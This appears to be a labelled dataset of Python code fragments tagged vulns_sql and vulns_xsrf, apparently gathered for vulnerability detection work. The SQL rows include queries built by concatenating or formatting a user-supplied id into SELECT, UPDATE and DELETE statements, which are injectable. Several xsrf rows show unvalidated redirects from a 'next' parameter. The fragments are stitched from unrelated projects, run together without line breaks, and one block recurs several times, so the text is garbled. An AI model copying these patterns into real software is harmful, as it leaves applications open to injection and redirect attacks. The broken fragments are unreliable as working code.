"    sql = ('SELECT note_id, user_id, content, created_at, updated_at '",vulns_sql
"                       f'SELECT note_id, user_id, content,'",vulns_sql
"                'UPDATE note SET content = ?, updated_at = CURRENT_TIMESTAMP'                (note.content, note.note_id))            cur.execute('INSERT INTO note(user_id, content) VALUES(?, ?)',                        (note.user_id, note.content))",vulns_sql
             request_param='action=delete'),vulns_sql
    return HTTPNoContent(),vulns_sql
"                                     user='root',  # change the user and password as needed                                     password='',",vulns_sql
"    mysql = connectToMySQL(""users_db"")    mysql = connectToMySQL(""users_db"")    user = mysql.query_db(""SELECT * FROM users WHERE id = {};"".format(id))        mysql = connectToMySQL(""users_db"")        query = ""INSERT INTO users (first_name, last_name, email, description, created_at) VALUES (%(fn)s, %(ln)s, %(e)s, %(d)s, now());""",vulns_sql
"        return redirect(f'/users/{new_user}')   user_id = id   mysql = connectToMySQL(""users_db"")   if request.method == 'POST':       query = ""UPDATE users SET first_name = %(fn)s, last_name = %(ln)s, email= %(e)s, description = %(d)s, updated_at = now() WHERE id = "" + user_id + "";""       data = {           ""fn"" : request.form['first_name'],           ""ln"" : request.form['last_name'],           ""e"" : request.form['email'],           ""d"" : request.form['description'],       }       mysql.query_db(query, data)       return redirect('/users/{}'.format(user_id))   else:       user = mysql.query_db(""SELECT * FROM users WHERE id = "" + user_id + "";"")       return render_template('edit.html', user=user[0])   user_id = id   mysql = connectToMySQL(""users_db"")   query = ""DELETE from users WHERE id = "" + user_id + "";""   deleted_user = mysql.query_db(query)   return redirect('/users')",vulns_sql
"    date = fields.Date(string='Date', index=True)    activity_id = fields.Many2one('extraschool.activity', string='Activity', index=True)    place_id = fields.Many2one('extraschool.place', string='Place', index=True)    rancge = fields.Char( string='Range', index=True)    child_id = fields.Many2one('extraschool.child', string='Child', index=True)",vulns_sql
"                insert_querry = """"""                                insert into extraschool_presta_stat                                    (date, activity_id, place_id, level, rancge, nbr_child, child_id)                                                                        select prestation_date, %s, placeid, level, %s, count(*), child_id                                    from                                     (select prestation_date, activityid, placeid, prestation_time, es, level, child_id                                        from                                        (select activityid, placeid, childid AS child_id, prestation_date, prestation_time, es, l.leveltype as level                                        from extraschool_prestationtimes p                                        left join extraschool_activityoccurrence o on o.id = p.activity_occurrence_id                                         left join extraschool_child c on c.id = p.childid                                        left join extraschool_level l on l.id = c.levelid                                        where o.activityid = %s and                                                                                              p.prestation_time <= %s and                                              p.prestation_time =                                            (                                              select max(pp.prestation_time)                                              from extraschool_prestationtimes pp                                              left join extraschool_activityoccurrence oo                                                 on oo.id = pp.activity_occurrence_id                                              where oo.activityid = %s and                                                pp.prestation_date = p.prestation_date and                                                pp.prestation_time <= %s and                                                p.childid = pp.childid                                                    )                                        ) zz                                        where (zz.prestation_time >= %s and zz.prestation_time <= %s) or                                            (zz.prestation_time <= %s and es = 'E')                                    ) qq                                    group by activityid, placeid, prestation_date, level, child_id",vulns_sql
"                self.env.cr.execute(insert_querry,(activity.id,period_str,activity.id,prest_to,activity.id,prest_to,last_period,prest_to,last_period))",vulns_sql
"                        WHERE player_id = '%s'"""""" % player_id)",vulns_sql
proto_pattern = r'\bFuzzer: (?:afl|libFuzzer)_wireshark_fuzzshark_([a-z_-]+)\b',vulns_xsrf
"from files.discovered import VULN_LIST, FORMS_TESTED, REQUEST_TOKENS",vulns_xsrf
        config.HEADER_VALUES[m.split('=')[0]] = m.split('=')[1],vulns_xsrf
""""""" Configuration variables for defining remote applications.",vulns_xsrf
"        request_token_params={'scope': '/authenticate'},        authorize_url=""https://orcid.org/oauth/authorize#show_login"",",vulns_xsrf
"                    next=request.args.get('next', '/')",vulns_xsrf
"    if request.args.get('next', None):        return redirect(request.args.get('next'))",vulns_xsrf
"        if request.args.get('next', None):            return redirect(request.args.get('next'))",vulns_xsrf
"from mock import MagicMock, patchfrom six.moves.urllib_parse import quote_plusfrom invenio.testsuite import make_test_suite, run_test_suite",vulns_xsrf
"    def test_login(self):        resp = self.client.get(url_for(""oauthclient.login"", remote_app='test'))        self.assertEqual(            resp.location,            ""https://foo.bar/oauth/authorize?response_type=code&""            ""client_id=testid&redirect_uri=%s"" % quote_plus(url_for(                ""oauthclient.authorized"", remote_app='test', _external=True            ))",vulns_xsrf
            resp = self.assertRaises(,vulns_xsrf
"    def test_token_getter_setter(self, save_session):",vulns_xsrf
"                assert session['oauth_token_full'] == ('test_access_token', '')",vulns_xsrf
"    def test_rejected(self, save_session):",vulns_xsrf
""""""" Client blueprint used to handle OAuth callbacks. """"""from flask import Blueprint, abort, current_app, url_for, request    make_handler, disconnect_handler, oauth_logout_handler",vulns_xsrf
"    """""" Setup OAuth clients. """"""",vulns_xsrf
"    """""" Send user to remote application for authentication. """"""        next=request.args.get('next') or request.referrer or None,    return oauth.remote_apps[remote_app].authorize(callback=callback_url)    """""" Authorized handler callback. """"""    """""" Extra signup step. """"""",vulns_xsrf
"    """""" Disconnect user from remote application.",vulns_xsrf
""""""" Configuration variables for defining remote applications.",vulns_xsrf
"        request_token_params={'scope': '/authenticate'},        authorize_url=""https://orcid.org/oauth/authorize#show_login"",",vulns_xsrf
"                    next=request.args.get('next', '/')",vulns_xsrf
"    if request.args.get('next', None):        return redirect(request.args.get('next'))",vulns_xsrf
"        if request.args.get('next', None):            return redirect(request.args.get('next'))",vulns_xsrf
"from mock import MagicMock, patchfrom six.moves.urllib_parse import quote_plusfrom invenio.testsuite import make_test_suite, run_test_suite",vulns_xsrf
"    def test_login(self):        resp = self.client.get(url_for(""oauthclient.login"", remote_app='test'))        self.assertEqual(            resp.location,            ""https://foo.bar/oauth/authorize?response_type=code&""            ""client_id=testid&redirect_uri=%s"" % quote_plus(url_for(                ""oauthclient.authorized"", remote_app='test', _external=True            ))",vulns_xsrf
            resp = self.assertRaises(,vulns_xsrf
"    def test_token_getter_setter(self, save_session):",vulns_xsrf
"                assert session['oauth_token_full'] == ('test_access_token', '')",vulns_xsrf
"    def test_rejected(self, save_session):",vulns_xsrf
""""""" Client blueprint used to handle OAuth callbacks. """"""from flask import Blueprint, abort, current_app, url_for, request    make_handler, disconnect_handler, oauth_logout_handler",vulns_xsrf
"    """""" Setup OAuth clients. """"""",vulns_xsrf
"    """""" Send user to remote application for authentication. """"""        next=request.args.get('next') or request.referrer or None,    return oauth.remote_apps[remote_app].authorize(callback=callback_url)    """""" Authorized handler callback. """"""    """""" Extra signup step. """"""",vulns_xsrf
"    """""" Disconnect user from remote application.",vulns_xsrf
""""""" Configuration variables for defining remote applications.",vulns_xsrf
"        request_token_params={'scope': '/authenticate'},        authorize_url=""https://orcid.org/oauth/authorize#show_login"",",vulns_xsrf
"                    next=request.args.get('next', '/')",vulns_xsrf
"    if request.args.get('next', None):        return redirect(request.args.get('next'))",vulns_xsrf
"        if request.args.get('next', None):            return redirect(request.args.get('next'))",vulns_xsrf
"from mock import MagicMock, patchfrom six.moves.urllib_parse import quote_plusfrom invenio.testsuite import make_test_suite, run_test_suite",vulns_xsrf
"    def test_login(self):        resp = self.client.get(url_for(""oauthclient.login"", remote_app='test'))        self.assertEqual(            resp.location,            ""https://foo.bar/oauth/authorize?response_type=code&""            ""client_id=testid&redirect_uri=%s"" % quote_plus(url_for(                ""oauthclient.authorized"", remote_app='test', _external=True            ))",vulns_xsrf
            resp = self.assertRaises(,vulns_xsrf
"    def test_token_getter_setter(self, save_session):",vulns_xsrf
"                assert session['oauth_token_full'] == ('test_access_token', '')",vulns_xsrf
"    def test_rejected(self, save_session):",vulns_xsrf
""""""" Client blueprint used to handle OAuth callbacks. """"""from flask import Blueprint, abort, current_app, url_for, request    make_handler, disconnect_handler, oauth_logout_handler",vulns_xsrf
"    """""" Setup OAuth clients. """"""",vulns_xsrf
"    """""" Send user to remote application for authentication. """"""        next=request.args.get('next') or request.referrer or None,    return oauth.remote_apps[remote_app].authorize(callback=callback_url)    """""" Authorized handler callback. """"""    """""" Extra signup step. """"""",vulns_xsrf
"    """""" Disconnect user from remote application.",vulns_xsrf
""""""" Configuration variables for defining remote applications.",vulns_xsrf
"        request_token_params={'scope': '/authenticate'},        authorize_url=""https://orcid.org/oauth/authorize#show_login"",",vulns_xsrf
"                    next=request.args.get('next', '/')",vulns_xsrf
"    if request.args.get('next', None):        return redirect(request.args.get('next'))",vulns_xsrf
"        if request.args.get('next', None):            return redirect(request.args.get('next'))",vulns_xsrf
"from mock import MagicMock, patchfrom six.moves.urllib_parse import quote_plusfrom invenio.testsuite import make_test_suite, run_test_suite",vulns_xsrf
"    def test_login(self):        resp = self.client.get(url_for(""oauthclient.login"", remote_app='test'))        self.assertEqual(            resp.location,            ""https://foo.bar/oauth/authorize?response_type=code&""            ""client_id=testid&redirect_uri=%s"" % quote_plus(url_for(                ""oauthclient.authorized"", remote_app='test', _external=True            ))",vulns_xsrf
            resp = self.assertRaises(,vulns_xsrf
"    def test_token_getter_setter(self, save_session):",vulns_xsrf
"                assert session['oauth_token_full'] == ('test_access_token', '')",vulns_xsrf
"    def test_rejected(self, save_session):",vulns_xsrf
""""""" Client blueprint used to handle OAuth callbacks. """"""from flask import Blueprint, abort, current_app, url_for, request    make_handler, disconnect_handler, oauth_logout_handler",vulns_xsrf
"    """""" Setup OAuth clients. """"""",vulns_xsrf
"    """""" Send user to remote application for authentication. """"""        next=request.args.get('next') or request.referrer or None,    return oauth.remote_apps[remote_app].authorize(callback=callback_url)    """""" Authorized handler callback. """"""    """""" Extra signup step. """"""",vulns_xsrf
"    """""" Disconnect user from remote application.",vulns_xsrf
""""""" Configuration variables for defining remote applications.",vulns_xsrf
"        request_token_params={'scope': '/authenticate'},        authorize_url=""https://orcid.org/oauth/authorize#show_login"",",vulns_xsrf
"                    next=request.args.get('next', '/')",vulns_xsrf
"    if request.args.get('next', None):        return redirect(request.args.get('next'))",vulns_xsrf
"        if request.args.get('next', None):            return redirect(request.args.get('next'))",vulns_xsrf
"from mock import MagicMock, patchfrom six.moves.urllib_parse import quote_plusfrom invenio.testsuite import make_test_suite, run_test_suite",vulns_xsrf
"    def test_login(self):        resp = self.client.get(url_for(""oauthclient.login"", remote_app='test'))        self.assertEqual(            resp.location,            ""https://foo.bar/oauth/authorize?response_type=code&""            ""client_id=testid&redirect_uri=%s"" % quote_plus(url_for(                ""oauthclient.authorized"", remote_app='test', _external=True            ))",vulns_xsrf
            resp = self.assertRaises(,vulns_xsrf
"    def test_token_getter_setter(self, save_session):",vulns_xsrf
"                assert session['oauth_token_full'] == ('test_access_token', '')",vulns_xsrf
"    def test_rejected(self, save_session):",vulns_xsrf
""""""" Client blueprint used to handle OAuth callbacks. """"""from flask import Blueprint, abort, current_app, url_for, request    make_handler, disconnect_handler, oauth_logout_handler",vulns_xsrf
"    """""" Setup OAuth clients. """"""",vulns_xsrf
"    """""" Send user to remote application for authentication. """"""        next=request.args.get('next') or request.referrer or None,    return oauth.remote_apps[remote_app].authorize(callback=callback_url)    """""" Authorized handler callback. """"""    """""" Extra signup step. """"""",vulns_xsrf
"    """""" Disconnect user from remote application.",vulns_xsrf
"            (r'/static/.*', module_static.StaticHandler),",vulns_xsrf
        self._headers = tornado.httputil.HTTPHeaders(),vulns_xsrf
            self._headers = tornado.httputil.HTTPHeaders(),vulns_xsrf
            self._headers = tornado.httputil.HTTPHeaders()        self._headers = tornado.httputil.HTTPHeaders(),vulns_xsrf
        if self.xsrf_token != token:,vulns_xsrf
            self.clear_all_cookies(),vulns_xsrf
"    def __init__(self, socket_manager):",vulns_xsrf
            'xsrf_cookies': True,vulns_xsrf
"            'xsrf_cookies': xsrf_cookies,            'xsrf_cookies_kwargs': {'HttpOnly': True}",vulns_xsrf
            tornado.web.RequestHandler.check_xsrf_cookie(self),vulns_xsrf
"                        opener.addheaders = [(""Accept-Charset"", ""utf-8, iso-8859-1""), (""Accept-Language"", ""zh-cn, zh-hans, zh-tw, zh-hant, zh, en-us, en-gb, en""), (""Range"", ""bytes=0-16383""), (""User-Agent"", ""Mozilla/5.0 (compatible; Titlebot; like IRCbot; +https://github.com/m13253/titlebot)""), (""X-Forwarded-For"", ""10.2.0.101""), (""X-moz"", ""prefetch""), (""X-Prefetch"", ""yes"")]",vulns_xsrf
"    if 'aeoid.user' in self.session:      del self.session['aeoid.user']    self.session.save()    self.redirect(self.request.get('continue', '/'))",vulns_xsrf
                           user_email_with_tags=user_email_with_tags),vulns_xsrf
        if not (self.params.contact_name and ,vulns_xsrf
"_BASE_URL_PATTERNS = [(r'global/admin/statistics/?',    urls.url('^(%s)$' % path_exp, view_func())    for (path_exp, view_func) in _BASE_URL_PATTERNS            '^(%s)/(%s)$' % (site_settings.OPTIONAL_PATH_PREFIX, path_exp),            view_func()) for (path_exp, view_func) in _BASE_URL_PATTERNS",vulns_xsrf
"    def render(self, template_name, **template_vars):",vulns_xsrf
"                                   get_vars, 0))",vulns_xsrf
"import urllibfrom google.appengine.ext import dbfrom google.appengine.api import usersfrom model import Authorization, ApiKeyManagementLogimport utilsfrom django.utils.html import escapefrom django.utils.translation import ugettext as _API_KEY_LENGTH = 16KEYS_PER_PAGE = 50AUTHORIZATION_PARAMS_LIST = [    'contact_name',    'contact_email',    'organization_name',    'domain_write_permission',    'read_permission',    'full_read_permission',    'search_permission',    'subscribe_permission',    'mark_notes_reviewed',    'believed_dead_permission',    'stats_permission',    'is_valid',]def to_authorization_params(param):    ret = {}    for param_name in AUTHORIZATION_PARAMS_LIST:        ret[param_name] = getattr(param, param_name)    return retclass ListApiKeys(utils.BaseHandler):    """"""    A handler for listing API keys for a particular domain.    TODO(ryok): implement a search/filter and pagination feature.    """"""    https_required = True    ignore_deactivation = True    repo_required = False    admin_required = True    @utils.require_api_key_management_permission    def get(self):        user = users.get_current_user()        q = Authorization.all().filter('repo =', self.repo or '*')        authorizations = q.fetch(KEYS_PER_PAGE)        nav_html = ('<a href=""%s"">%s</a> '                    % (self.get_url('admin/api_keys'),                       escape(_('Create a new API key'))))        user_email_with_tags = ('<span class=""email"">%s</span>'                % escape(user.email()))        xsrf_tool = utils.XsrfTool()        return self.render('admin_api_keys_list.html',                           nav_html=nav_html,                           admin_api_keys_url=self.get_url('/admin/api_keys'),                           user=user, authorizations=authorizations,                           user_email_with_tags=user_email_with_tags,                           xsrf_token=xsrf_tool.generate_token(                               user.user_id(), 'admin_api_keys'))class CreateOrUpdateApiKey(utils.BaseHandler):    """"""A handler for create/update API keys.""""""    https_required = True    ignore_deactivation = True    repo_required = False    admin_required = True    def render_form(self, authorization=None, message=''):        """"""Display a form for create/update Authorization""""""        user = users.get_current_user()        if authorization:            operation_name = _('Update an existing key')            nav_html = ('<a href=""%s"">%s</a> '                        % (self.get_url('admin/api_keys'),                           escape(_('Create a new API key'))))        else:            authorization = Authorization.DEFAULT_SETTINGS            operation_name = _('Create a new API key')            nav_html = ''        nav_html += ('<a href=""%s"">%s</a>'                     % (self.get_url('admin/api_keys/list'),                        escape(_('List API keys'))))        user_email_with_tags = ('<span class=""email"">%s</span>'                % escape(user.email()))        xsrf_tool = utils.XsrfTool()        return self.render(            'admin_api_keys.html',            user=user, target_key=authorization,            user_email_with_tags=user_email_with_tags,            login_url=users.create_login_url(self.request.url),            logout_url=users.create_logout_url(self.request.url),            operation_name=operation_name, message=message,            nav_html=nav_html,            xsrf_token=xsrf_tool.generate_token(                user.user_id(), 'admin_api_keys'),        )    @utils.require_api_key_management_permission    def get(self):        """"""        It can be called with a key of ApiKeyManagementLog entity. In        such a case, it will show a detailed information of the key in        a form for updating the key, otherwise, it will show a form        for creating a new API key.        """"""        management_log_key = self.request.get('log_key')        if management_log_key:            management_log = db.get(management_log_key)            message = ''            if management_log.action == ApiKeyManagementLog.CREATE:                message = _('A new API key has been created successfully.')            elif management_log.action == ApiKeyManagementLog.UPDATE:                message = _('The API key has been updated successfully.')            return self.render_form(management_log.authorization, message)        else:            return self.render_form()    @utils.require_api_key_management_permission    def post(self):        """"""Handle a post request from the create/update/edit form""""""        user = users.get_current_user()        xsrf_tool = utils.XsrfTool()        if not (self.params.xsrf_token and xsrf_tool.verify_token(                self.params.xsrf_token, user.user_id(), 'admin_api_keys')):            return self.error(403)        if self.request.get('edit_form'):            authorization = db.get(self.request.get('authorization_key'))            if not authorization:                return self.error(404, _('No such Authorization entity.'))            return self.render_form(authorization)        if not (self.params.contact_name and                self.params.contact_email and                self.params.organization_name):            return self.error(400, _('Please fill in all the required fields.'))        original_key = self.request.get('key')        if original_key:            existing_authorization = db.get(original_key)            if not existing_authorization:                return self.error(404, _('No such Authorization entity.'))            key_str = existing_authorization.api_key            action = ApiKeyManagementLog.UPDATE        else:            key_str = utils.generate_random_key(API_KEY_LENGTH)            action = ApiKeyManagementLog.CREATE        repo = self.repo or '*'        authorization = Authorization.create(            repo, key_str,            **to_authorization_params(self.params))        authorization.put()        management_log = ApiKeyManagementLog(repo=repo,                                             api_key=authorization.api_key,                                             action=action)        management_log.put()        self.redirect('/admin/api_keys?repo=%s&log_key=%s'                      % (self.repo, management_log.key()))",vulns_xsrf
"from const import *from model import *from utils import *import revealclass Handler(BaseHandler):    """"""An admin page to delete person records.""""""    ignore_deactivation = True    repo_required = False    admin_required = True    def get(self):        xsrf_tool = XsrfTool()        user = users.get_current_user()        self.render(            'admin_delete_record.html',            id=self.env.domain + '/person.',            xsrf_token=xsrf_tool.generate_token(                user.user_id(), 'admin_delete_record'))    def post(self):        xsrf_tool = XsrfTool()        user = users.get_current_user()        if not (self.params.xsrf_token and xsrf_tool.verify_token(                    self.params.xsrf_token, user.user_id(),                    'admin_delete_record')):            self.error(403)            return False        action = ('delete', str(self.params.id))        self.redirect('/delete', id=self.params.id,                      signature=reveal.sign(action))",vulns_xsrf
"        [hmac_digest, action_time_str] = token.split('/')          return False",vulns_xsrf
    def test_rejects_invalid_token(self):,vulns_xsrf
"""""""Access restriction tests.""""""import django.urlsimport urlsimport viewsimport view_tests_baseclass AccessRestrictionTests(view_tests_base.ViewTestsBase):    """"""Tests that access restrictions are enforced.""""""    IS_RESTRICTED_TO_ADMINS = {        'admin_apikeys-manage': True,        'admin_apikeys-list': True,        'admin_create-repo': True,        'admin_delete-record': True,        'admin_statistics': True,        'meta_sitemap': False,    }    def get_path(self, path_name):        try:            return django.urls.reverse(path_name)        except django.urls.NoReverseMatch:            return django.urls.reverse(path_name, kwargs={'repo': 'haiti'})    def test_blocked_to_non_admins(self):        """"""Tests that admin-only pages aren't available to non-admins.""""""        self.login(is_admin=False)        for (path_name, _            ) in filter(lambda item: item[1],                        AccessRestrictionTests.IS_RESTRICTED_TO_ADMINS.items()):            path = self.get_path(path_name)            assert self.client.get(path, secure=True).status_code == 403            assert self.client.post(path, secure=True).status_code == 403    def test_available_to_admins(self):        """"""Tests that admin-only pages are available to admins.        This is a sort of meta-test: I'm not really concerned that we might        accidentally lock admins out of the admin pages, but I do want to make        sure that the test above actually depends on the user not being an admin        (as opposed to access getting denied because the tests are set up wrong        somehow).        """"""        self.login(is_admin=True)        for (path_name, _            ) in filter(lambda item: item[1],                        AccessRestrictionTests.IS_RESTRICTED_TO_ADMINS.items()):            path = self.get_path(path_name)            assert self.client.get(path, secure=True).status_code == 200    def test_other_pages_unrestricted(self):        """"""Tests that non-admins can access unrestricted pages.""""""        self.login(is_admin=False)        for (path_name, _            ) in filter(lambda item: not item[1],                        AccessRestrictionTests.IS_RESTRICTED_TO_ADMINS.items()):            path = self.get_path(path_name)            assert self.client.get(path, secure=True).status_code != 403    def test_all_paths_included(self):        """"""Tests that all (Django-served) pages are listed.        We want to make sure no one forgets to add these tests for admin pages,        so we require that each URL path is included in the dictionary above.        """"""        for pattern in urls.urlpatterns:            if pattern.name.startswith('prefixed__'):                continue            if pattern.name.startswith('tasks_'):                continue            assert (                pattern.name in AccessRestrictionTests.IS_RESTRICTED_TO_ADMIN",vulns_xsrf
    _USER_ID = 'k',vulns_xsrf
"            user_email='kay@mib.gov',            user_id=ViewTestsBase._USER_ID,        return self._xsrf_tool.generate_token(ViewTestsBase._USER_ID, action_id)",vulns_xsrf
"                           settingsFilename, htmlSettingsForm))",vulns_xsrf
"from jupyter_core.paths import jupyter_data_dirimport subprocessPEM_FILE = os.path.join(jupyter_data_dir(), 'notebook.pem')c = get_config()c.NotebookApp.ip = os.getenv('INTERFACE', '') or '*'c.NotebookApp.port = int(os.getenv('PORT', '') or 8888)c.NotebookApp.open_browser = Falseif 'USE_HTTPS' in os.environ:    if not os.path.isfile(PEM_FILE):        subprocess.check_call(['openssl', 'req', '-new',             '-newkey', 'rsa:2048', '-days', '365', '-nodes', '-x509',            '-subj', '/C=XX/ST=XX/L=XX/O=generated/CN=generated',            '-keyout', PEM_FILE, '-out', PEM_FILE])    c.NotebookApp.certfile = PEM_FILEif 'PASSWORD' in os.environ:    from IPython.lib import passwd    c.NotebookApp.password = passwd(os.environ['PASSWORD'])    del os.environ['PASSWORD']",vulns_xsrf
"from jupyter_core.paths import jupyter_data_dirimport subprocessPEM_FILE = os.path.join(jupyter_data_dir(), 'notebook.pem')c = get_config()c.NotebookApp.ip = os.getenv('INTERFACE', '') or '*'c.NotebookApp.port = int(os.getenv('PORT', '') or 8888)c.NotebookApp.open_browser = Falseif 'USE_HTTPS' in os.environ:    if not os.path.isfile(PEM_FILE):        subprocess.check_call(['openssl', 'req', '-new',             '-newkey', 'rsa:2048', '-days', '365', '-nodes', '-x509',            '-subj', '/C=XX/ST=XX/L=XX/O=generated/CN=generated',            '-keyout', PEM_FILE, '-out', PEM_FILE])    c.NotebookApp.certfile = PEM_FILEif 'PASSWORD' in os.environ:    from IPython.lib import passwd    c.NotebookApp.password = passwd(os.environ['PASSWORD'])    del os.environ['PASSWORD']",vulns_xsrf
"        'notebook >= 4.2',",vulns_xsrf
"    postParser = subparsers.add_parser('post', help='post a new ad')    postParser.add_argument('inf_file', type=str, help='.inf file containing posting details')    postParser.set_defaults(function=post_ad)    folderParser = subparsers.add_parser('folder', help='post ad from folder')    folderParser.add_argument('folderName', type=str, help='folder containing ad details')    folderParser.set_defaults(function=post_folder)    repostFolderParser = subparsers.add_parser('repost_folder', help='post ad from folder')    repostFolderParser.add_argument('folderName', type=str, help='folder containing ad details')    repostFolderParser.set_defaults(function=repost_folder)    showParser = subparsers.add_parser('show', help='show currently listed ads')    showParser.set_defaults(function=show_ads)    deleteParser = subparsers.add_parser('delete', help='delete a listed ad')    deleteParser.add_argument('id', type=str, help='id of the ad you wish to delete')    deleteParser.set_defaults(function=delete_ad)    nukeParser = subparsers.add_parser('nuke', help='delete all ads')    nukeParser.set_defaults(function=nuke)    checkParser = subparsers.add_parser('check_ad', help='check if ad is active')    checkParser.add_argument('folderName', type=str, help='folder containing ad details')    checkParser.set_defaults(function=check_ad)    repostParser = subparsers.add_parser('repost', help='repost an existing ad')    repostParser.add_argument('inf_file', type=str, help='.inf file containing posting details')    repostParser.set_defaults(function=repost_ad)    buildParser = subparsers.add_parser('build_ad', help='Generates the item.inf file for a new ad')    buildParser.set_defaults(function=generate_inf_file)",vulns_xsrf
"    cred_file = args.folderName + ""/login.inf""",vulns_xsrf
    os.chdir(args.folderName),vulns_xsrf
"    [data, imageFiles] = get_inf_details(args.inf_file)            print(""Failed Attempt #"" + str(attempts) + "", trying again."")        api.post_ad_using_data(data, imageFiles)        sleep(180)        print(""Failed Attempt #"" + str(attempts) + "", giving up."")",vulns_xsrf
"    [print(""{} '{}'"".format(adId, adName)) for adName, adId in api.get_all_ads()]",vulns_xsrf
"    delAdName = """"            delAdName = val        api.delete_ad_using_title(delAdName)",vulns_xsrf
    os.chdir(args.folderName),vulns_xsrf
"    AdName = """"            AdName = val    allAds = api.get_all_ads()    return [t for t, i in allAds if t == AdName]",vulns_xsrf
"    allAds = api.get_all_ads()    [api.delete_ad(adId) for adName, adId in allAds]def generate_inf_file(args):",vulns_xsrf
import requestsimport bs4from multiprocessing import Pool,vulns_xsrf
"    def __init__(self, dump=None):            self.dumpfilepath = ""kijiji_dump_{}.txt"".format(strftime(""%Y%m%dT%H%M%S""))            return ""See {} in current directory for latest dumpfile."".format(self.dumpfilepath)            return """"class SignInException(KijijiApiException):    def __str__(self):        return ""Could not sign in.\n""+super().__str__()class PostAdException(KijijiApiException):    def __str__(self):        return ""Could not post ad.\n""+super().__str__()class BannedException(KijijiApiException):    def __str__(self):        return ""Could not post ad, this user is banned.\n""+super().__str__()class DeleteAdException(KijijiApiException):    def __str__(self):        return ""Could not delete ad.\n""+super().__str__()def get_token(html, token_name):    Retrive CSRF token from webpage    Tokens are different every time a page is visitied    res = soup.select(""[name={}]"".format(token_name))    if not res:        print(""Token '{}' not found in html text."".format(token_name))        return """"    return res[0]['value']",vulns_xsrf
"            'targetUrl': 'L3QtbG9naW4uaHRtbD90YXJnZXRVcmw9TDNRdGJHOW5hVzR1YUhSdGJEOTBZWEpuWlhSVmNtdzlUREpuZEZwWFVuUmlNalV3WWpJMGRGbFlTbXhaVXpoNFRucEJkMDFxUVhsWWJVMTZZbFZLU1dGVmJHdGtiVTVzVlcxa1VWSkZPV0ZVUmtWNlUyMWpPVkJSTFMxZVRITTBVMk5wVW5wbVRHRlFRVUZwTDNKSGNtVk9kejA5XnpvMnFzNmc2NWZlOWF1T1BKMmRybEE9PQ--'            }            raise SignInException(resp.text)        index_page_text = self.session.get('https://www.kijiji.ca/m-my-ads.html/').text        return ""Sign Out"" in index_page_text",vulns_xsrf
"            'ca.kijiji.xsrf.token': get_token(my_ads_page.text, 'ca.kijiji.xsrf.token')            }        if (""OK"" not in resp.text):            raise DeleteAdException(resp.text)        allAds = self.get_all_ads()        [self.delete_ad(i) for t, i in allAds if t.strip() == title.strip()]        Upload one or more photos to Kijiji concurrently using Pool",vulns_xsrf
"                files = {'file': img_file}                r = self.session.post(image_upload_url, files=files, headers={""x-ebay-box-token"": token})                if (r.status_code != 200):                    print(r.status_code)                except (KeyError, ValueError) as e:",vulns_xsrf
"        resp = self.session.get('https://www.kijiji.ca/p-admarkt-post-ad.html?categoryId=773')        token_regex = r""initialXsrfToken: '\S+'""        image_upload_token = re.findall(token_regex, resp.text)[0].strip(""initialXsrfToken: '"").strip(""'"")        imageList = self.upload_image(image_upload_token, image_files)        data['images'] = "","".join(imageList)        if not len(data.get(""postAdForm.title"", """")) >= 10:            raise AssertionError(""Your title is too short!"")        if (int(resp.status_code) != 200 or \                ""Delete Ad?"" not in resp.text):                raise BannedException(resp.text)                raise PostAdException(resp.text)        new_cookie_with_ad_id = resp.headers['Set-Cookie']        ad_id = re.search('\d+', new_cookie_with_ad_id).group()",vulns_xsrf
"        user_id=get_token(resp.text, 'userId')        my_ads_url = 'https://www.kijiji.ca/j-get-my-ads.json?_=1&currentOffset=0&isPromoting=false&show=ACTIVE&user={}'.format(user_id)",vulns_xsrf
"        yield scrapy.Request(self.login_url, self.parse_login)        print(response.url)        yield scrapy.FormRequest.from_response(response, formdata=self.login_data, callback=self.start_crawl)",vulns_xsrf
"                    yield scrapy.Request(url=sub_link, callback=self.parse)",vulns_xsrf
            yield self.collection.insert_one(entry),vulns_xsrf
from twisted.web.error import FlattenerErrorfrom twisted.python.filepath import FilePath,vulns_xsrf
from pixelated.resources import BaseResource,vulns_xsrf
from twisted.web.resource import Resource,vulns_xsrf
"        return Resource.getChild(self, path, request)        self.putChild('assets', File(self._static_folder))        self.putChild('keys', KeysResource(self._services_factory))        self.putChild(AttachmentsResource.BASE_URL, AttachmentsResource(self._services_factory))        self.putChild('contacts', ContactsResource(self._services_factory))        self.putChild('features', FeaturesResource(portal))        self.putChild('tags', TagsResource(self._services_factory))        self.putChild('mails', MailsResource(self._services_factory))        self.putChild('mail', MailResource(self._services_factory))        self.putChild('feedback', FeedbackResource(self._services_factory))        self.putChild('user-settings', UserSettingsResource(self._services_factory))        self.putChild(LoginResource.BASE_URL, LoginResource(self._services_factory, portal, disclaimer_banner=disclaimer_banner))        self.putChild(LogoutResource.BASE_URL, LogoutResource(self._services_factory))",vulns_xsrf
"    def get(self, path, get_args='', as_json=True):        request = request_mock(path)    def post(self, path, body='', headers=None):        request = request_mock(path=path, method=""POST"", body=body, headers=headers)    def put(self, path, body):        request = request_mock(path=path, method=""PUT"", body=body, headers={'Content-Type': ['application/json']})    def delete(self, path, body=""""):        request = request_mock(path=path, body=body, headers={'Content-Type': ['application/json']}, method=""DELETE"")",vulns_xsrf
"    def get_attachment(self, ident, encoding, filename=None, content_type=None):        deferred_result, req = self.get(""/attachment/%s"" % ident, params, as_json=False)",vulns_xsrf
"def request_mock(path='', method='GET', body='', headers={}):",vulns_xsrf
from pixelated.resources.root_resource import RootResource,vulns_xsrf
"    client.listenTCP()    proxy = Proxy(proxy_port='8889', app_port='4567')    context.call_to_terminate_proxy = proxy.run_on_a_thread()",vulns_xsrf
    context.call_to_terminate_proxy(),vulns_xsrf
            xsrf_header = request.getHeader('x-xsrf-token'),vulns_xsrf
from twisted.web.error import FlattenerErrorfrom twisted.python.filepath import FilePath,vulns_xsrf
from pixelated.resources import BaseResource,vulns_xsrf
from twisted.web.resource import Resource,vulns_xsrf
"        return Resource.getChild(self, path, request)        self.putChild('assets', File(self._static_folder))        self.putChild('keys', KeysResource(self._services_factory))        self.putChild(AttachmentsResource.BASE_URL, AttachmentsResource(self._services_factory))        self.putChild('contacts', ContactsResource(self._services_factory))        self.putChild('features', FeaturesResource(portal))        self.putChild('tags', TagsResource(self._services_factory))        self.putChild('mails', MailsResource(self._services_factory))        self.putChild('mail', MailResource(self._services_factory))        self.putChild('feedback', FeedbackResource(self._services_factory))        self.putChild('user-settings', UserSettingsResource(self._services_factory))        self.putChild(LoginResource.BASE_URL, LoginResource(self._services_factory, portal, disclaimer_banner=disclaimer_banner))        self.putChild(LogoutResource.BASE_URL, LogoutResource(self._services_factory))",vulns_xsrf
